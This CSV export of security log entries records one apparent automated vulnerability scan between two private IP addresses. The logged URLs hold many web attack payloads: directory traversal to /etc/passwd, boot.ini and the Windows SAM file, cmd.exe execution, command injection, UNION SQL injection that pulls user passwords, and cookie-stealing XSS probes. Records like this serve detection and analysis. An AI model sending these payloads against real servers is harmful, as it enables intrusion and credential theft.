ID_regla,sessionid,repeatcnt,severity_number,Nombre_regla,thread_category,prot,src_ip,dst_ip,log_subtype,extra_data
9999,415337,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/webmail/horde/test.php
9999,415337,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/whateverHuFc.html
9999,415337,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/ws_ftp.ini
9999,415337,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/WS_FTP.ini
9999,415337,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/_mem_bin/auoconfig.asp
9999,415337,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/_mem_bin/auoconfig.asp
9999,415337,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/_mem_bin/remind.asp
9999,415337,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/exchange/lib/ATTACH.INC
9999,415337,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/SiteServer/Admin/knowledge/persmbr/vs.asp
9999,415337,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/SiteServer/Admin/knowledge/persmbr/VsLsLpRd.asp
9999,415337,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/SiteServer/Admin/knowledge/persmbr/VsPrAuoEd.asp
9999,415337,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/SiteServer/Admin/knowledge/persmbr/VsTmPr.asp
9999,415337,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/trace.axd
9999,415337,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/tvcs/getservers.exe?action=selects1
9999,415337,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/whatever.htr
9999,415338,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/domlog.nsf
9999,415338,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/events4.nsf
9999,415338,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/log.nsf
9999,415338,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/names.nsf
9999,415338,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/LOGIN.PWD
9999,415338,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/USER/CONFIG.AP
9999,415338,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/.perf
9999,415338,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/
9999,415326,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/
9999,415341,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/index.html
9999,415341,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/852566C90012664F
9999,415341,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/hidden.nsf
9999,415341,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/mail.box
9999,415341,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/setup.nsf
9999,415341,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/statrep.nsf
9999,415341,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/webadmin.nsf
9999,415341,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/examples/servlet/AUX
9999,415341,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/cfdocs/cfmlsyntaxcheck.cfm
9999,415341,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/Config1.htm
9999,415341,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/contents/extensions/asp/1
9999,415341,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/WebAdmin.dll?View=Logon
9999,415341,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/cgi-win/cgitest.exe
9999,415341,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/../../../../../../../../../../etc/passwd
9999,415341,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/c/winnt/system32/cmd.exe?/c+dir+/OG
9999,415341,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/../../../../../winnt/system32/cmd.exe?/c+dir+c:/
9999,415341,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/../../../../../winnt/system32/cmd.exe?/c+dir+c:/
9999,415341,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/msadc/samples/adctest.asp
9999,415341,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/1PuRJfiJX7
9999,415341,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/somethingnotthere.ida
9999,415341,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/cgi-shl/win-c-sample.exe
9999,415341,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/examples/servlet/TroubleShooter
9999,415341,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/goform/CheckLogin?login=root&password=tslinux
9999,415341,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/../ext.ini
9999,415341,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/../../ext.ini
9999,415341,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/../../ext.ini
9999,415341,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/cgi/cfdocs/expeval/ExprCalc.cfm?OpenFilePath=c:\winnt\win.ini
9999,415341,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/cgi/cfdocs/expeval/ExprCalc.cfm?OpenFilePath=c:\windows\win.ini
9999,415341,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/winnt/win.ini
9999,415341,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/prxdocs/misc/prxrch.idq?CiTemplate=../../../../../../../../../../winnt/win.ini
9999,415341,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/query.idq?CiTemplate=../../../../../../../../../../winnt/win.ini
9999,415341,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/iissamples/issamples/fastq.idq?CiTemplate=../../../../../../../../../../winnt/win.ini
9999,415341,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/iissamples/issamples/query.idq?CiTemplate=../../../../../../../../../../winnt/win.ini
9999,415341,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/default.htm
9999,415341,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/default.htm
9999,415341,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/................../config.sys
9999,415341,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/cfdocs/exampleapp/email/getfile.cfm?filename=c:\boot.ini
9999,415341,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/cfdocs/exampleapp/docs/sourcewindow.cfm?Template=c:\boot.ini
9999,415341,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/cfdocs/expeval/exprcalc.cfm?OpenFilePath=c:\boot.ini
9999,415341,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/netget?sid=user&msg=300&file=../../../../../../../../../boot.ini
9999,415341,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/netget?sid=user&msg=300&file=../../../../../../../../../../etc/passwd
9999,415341,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/php/php.exe?c:\winnt\boot.ini
9999,415341,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phpping/index.php?pingto=www.test.com%20|%20dir%20c://
9999,415341,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/scripts/db4web_c.exe/dbdirname/c:/boot.ini
9999,415341,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/us/cgi-bin/sewse.exe?d:/internet/sites/us/sewse/jabber/comment2.jse+c:/boot.ini
9999,415341,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/wx/s.dll?d=/boot.ini
9999,415341,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/../../../../../../../../../../boot.ini
9999,415341,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/servlet/webacc?User.html=../../../../../../../../../../../../../../../../../../boot.ini
9999,415341,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/ssi/envout.bat?../
9999,415341,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/php/php.exe?c:\boot.ini
9999,415341,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/../../../../../../../../../boot.ini
9999,415342,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/../../../../winnt/repair/sam._
9999,415343,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/../../../../../../../boot.ini
9999,415343,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2///etc/passwd
9999,415343,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2///etc/hosts
9999,415343,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/../.../boot.ini
9999,415344,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/.cobalt/admin/.htaccess
9999,415344,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/albums/userpics/Copperminer.jpg.php?cat%20/etc/passwd
9999,415344,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/autohtml.php?op=modload&mainfile=x&name=/etc/passwd
9999,415344,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/atomicboard/index.php?location=../../../../../../../../../../etc/passwd
9999,415344,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/current/modules.php?mod=fm&file=../../../../../../../../../../etc/passwd
9999,415344,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/current/index.php?site=demos&bn=../../../../../../../../../../etc/passwd
9999,415344,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/dev/translations.php?ONLY=../../../../../etc/passwd
9999,415344,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/../../../../../../../../etc/passwd
9999,415345,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/docs/showtemp.cfm?TYPE=JPEG&FILE=c:\boot.ini
9999,415345,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/ezhttpbench.php?AnalyseSite=/etc/passwd&NumLoops=1
9999,415345,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/index.php?download=/winnt/win.ini
9999,415345,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/index.php?download=/windows/win.ini
9999,415345,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/index.php?download=/etc/passwd
9999,415345,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/index.php?|=../../../../../../../../../etc/passwd
9999,415345,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/index.php?page=../../../../../../../../../../etc/passwd
9999,415345,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/index.php?page=../../../../../../../../../../boot.ini
9999,415345,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/index.php?l=forum/view.php&topic=../../../../../../../../../etc/passwd
9999,415345,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/jsp/jspsamp/jspexamples/viewsource.jsp?source=../../../../../../../../../../etc/passwd
9999,415345,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/jsp/jspsamp/jspexamples/viewsource.jsp?source=../../../../../../../../../../boot.ini
9999,415345,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/k/home?dir=/&file=../../../../../../../../etc/passwd&lang=kor
9999,415345,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/nph-showlogs.pl?files=../../../../../../../../etc/passwd&filter=.*&submit=Go&linecnt=500&refresh=0
9999,415345,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/nph-showlogs.pl?files=../../../../../../../../etc/&filter=.*&submit=Go&linecnt=500&refresh=0
9999,415345,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phprocketaddin/?page=../../../../../../../../../../boot.ini
9999,415345,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phpwebfilemgr/index.php?f=../../../../../../../../../etc/passwd
9999,415345,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phpwebfilemgr/index.php?f=../../../../../../../../../etc
9999,415345,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phptonuke.php?filnavn=/etc/passwd
9999,415345,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/put/cgi-bin/putport.exe?SWAP&BOM&OP=none&Lang=en-US&PutHtml=../../../../../../../../etc/passwd
9999,415345,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/ROADS/cgi-bin/search.pl?form=../../../../../../../../../../etc/passwd
9999,415345,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/support/common.php?f=0&ForumLang=../../../../../../../../../../etc/passwd
9999,415328,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/
9999,415345,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/viewpage.php?file=/etc/passwd
9999,415345,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/Web_Store/web_store.cgi?page=../../../../../../../../../../etc/passwd
9999,415345,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/webMathematica/MSP?MSPStoreID=../../../../../../../../../../boot.ini&MSPStoreType=image/gif
9999,415345,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/webMathematica/MSP?MSPStoreID=../../../../../../../../../../etc/passwd&MSPStoreType=image/gif
9999,415345,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/servlet/webacc?User.html=../../../../../../../../../../../../../../../../../../etc/passwd
9999,415345,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/webcalendar/forum.php?user_inc=../../../../../../../../../../etc/passwd
9999,415345,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/logbook.pl?file=../../../../../../../bin/cat%20/etc/passwd
9999,415345,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/page.cgi?etc/passwd
9999,415345,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/edittag/edittag.cgi?file=/../../../../../etc/passwd
9999,415345,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/base/webmail/readmsg.php?mailbox=../../../../../../../../../../../../../../etc/passwd&id=1
9999,415345,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/athenareg.php?pass=%20;cat%20/etc/passwd
9999,415345,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/PSUser/PSCOErrPage.htm?errPagePath=/etc/passwd
9999,415345,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/search?NS-query-pat=../../../../../../../../../../etc/passwd
9999,415345,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/search?NS-query-pat=../../../../../../../../../../boot.ini
9999,415345,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/../../../../../../temp/temp.class
9999,415345,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/../../../../../../../../../../etc/passwd
9999,415346,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/.../.../.../.../.../.../.../.../.../boot.ini
9999,415346,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/................../etc/passwd
9999,415346,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/?.jsp
9999,415346,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/../../../../../windows/win.ini
9999,415347,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/../../../../../../../etc/passwd
9999,415348,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/
9999,415348,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/../../../../../windows/win.ini
9999,415348,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/../../../../../etc/passwd
9999,415348,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/../../../../../../../winnt/win.ini
9999,415348,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/admentor/adminadmin.asp
9999,415348,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/imp/mailbox.php3?actionID=6&server=x&imapuser=x';somesql+--&pass=x
9999,415348,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/userinfo.php?uid=1;
9999,415348,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,"172.16.2.2/site/'%20UNION%20ALL%20SELECT%20FileToClob('/etc/passwd','server')::html,0%20FROM%20sysusers%20WHERE%20username=USER%20--/.html"
9999,415349,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,"172.16.2.2/site/'%20UNION%20ALL%20SELECT%20FileToClob('/etc/passwd','server')::html,0%20FROM%20sysusers%20WHERE%20username%20=%20USER%20--/.html"
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,"172.16.2.2/postnuke/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/*"
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,"172.16.2.2/postnuke/html/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/*"
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phpwebsite/index.php?module=calendar&calendar[view]=day&year=2003
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phpBB2/search.php?search_id=1\\
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,"172.16.2.2/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/*"
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/author.asp
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/horde/test.php
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/imp/horde/test.php
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/examples/cookie
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/examples/session
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/themes/mambosimple.php?detection=detected&sitename=</title><script>alert(document.cookie)</script>
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/index.php?option=search&searchword=<script>alert(document.cookie);</script>
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/emailfriend/emailnews.php?id=\
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/emailfriend/emailfaq.php?id=\
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/emailfriend/emailarticle.php?id=\
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/administrator/upload.php?newbanner=1&choice=\
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/administrator/popups/sectionswindow.php?type=web&link=\
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/administrator/gallery/view.php?path=\
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/administrator/gallery/uploadimage.php?directory=\
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/administrator/gallery/navigation.php?directory=\
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/administrator/gallery/gallery.php?directory=\
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/index.php?dir=<script>alert('Vulnerable')</script>
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/https-admserv/bin/index?/<script>alert(document.cookie)</script>
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/clusterframe.jsp?cluster=<script>alert(document.cookie)</script>
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/article.cfm?id=1'<script>alert(document.cookie);</script>
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/upload.php?type=\
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/soinfo.php?\
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules.php?op=modload&name=News&file=index&catid=&topic=><script>alert('Vulnerable');</script>;
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules.php?op=modload&name=News&file=article&sid=<script>alert('Vulnerable');</script>
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules.php?op=modload&name=News&file=article&sid=<script>alert('Vulnerable');</script+>
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/webtop/wdk/samples/dumpRequest.jsp?J=<script>alert('Vulnerable');</script>f
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/addyoursite.php?catid=&lt;Script&gt;JavaScript:alert('Vulnerable');&lt;/Script&gt;
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/666
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/servlet/MsgPage?action=test&msg=<script>alert('Vulnerable')</script>
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/servlet/org.apache.catalina.ContainerServlet/<script>alert('Vulnerable')</script>
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/servlet/org.apache.catalina.Context/<script>alert('Vulnerable')</script>
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/servlet/org.apache.catalina.Globals/<script>alert('Vulnerable')</script>
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/servlet/org.apache.catalina.servlets.WebdavStatus/<script>alert('Vulnerable')</script>
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/servlets/MsgPage?action=badlogin&msg=<script>alert('Vulnerable')</script>
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/<script>alert('Vulnerable')</script>.shtm
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/<script>alert('Vulnerable')</script>.stm
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/admin/sh_taskframes.asp?Title=Configuraci%c3%b3n%20de%20registro%20Web&URL=MasterSettings/Web_LogSettings.asp?tab1=TabsWebServer&tab2=TabsWebLogSettings&__SAPageKey=5742D5874845934A134CD05F39C63240&ReturnURL=\
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/SiteServer/Knowledge/Default.asp?ctr=\
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/_mem_bin/formslogin.asp?\
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/nosuchurl/><script>alert('Vulnerable')</script>
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/test.php?<SCRIPT>alert('Vulnerable')</SCRIPT>=x
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/test.shtml?<SCRIPT>alert('Vulnerable')</SCRIPT>=x
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/search/results.stm?query=&lt;script&gt;alert('vulnerable');&lt;/script&gt;
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/webcalendar/week.php?eventinfo=<script>alert(document.cookie)</script>
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/~/<script>alert('Vulnerable')</script>.aspx?aspxerrorpath=null
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/~/<script>alert('Vulnerable')</script>.aspx
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/~/<script>alert('Vulnerable')</script>.asp
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/z_user_show.php?method=showuserlink&class=<Script>javascript:alert(document.cookie)</Script>&rollid=admin&x=3da59a9da8825&
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/catinfo?<u><b>TESTING
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/webchat/register.php?register=yes&username=OverG&email=<script>alert%20(/
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/webamil/test.php
9999,415350,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/users.php?mode=profile&uid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
